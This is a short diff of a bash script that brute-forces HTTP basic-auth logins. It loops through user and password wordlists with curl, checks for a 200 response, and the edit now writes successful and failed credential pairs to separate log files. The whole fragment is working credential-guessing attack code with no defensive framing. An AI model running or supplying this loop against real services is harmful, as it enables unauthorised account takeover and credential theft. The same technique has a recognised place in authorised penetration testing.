@@ -38,9 +38,9 @@ for user in $(cat <path to user wordlist>); do
   for pass in $(cat <path to pwd wordlist>); do
     http_code=$(curl -v -L -u "$user":"$pass" "$url" -w '%{http_code}' -o /dev/null -s)
     if [[ $http_code -eq 200 ]]; then
-      echo "Success: Address:'$ADDRESS' User:'$user' Pass:'$pass'"
+      echo "Success: Address:'$ADDRESS' User:'$user' Pass:'$pass'" >> <location to save successful outfile and desired file name>
       break
-else echo  "Failed: "$user" and "$pass" on "$ADDRESS"" >> <location to save outfile and desired file name>
+else echo  "Failed: "$user" and "$pass" on "$ADDRESS"" >> <location to save failed outfile and desired file name>
     fi
   done
 done
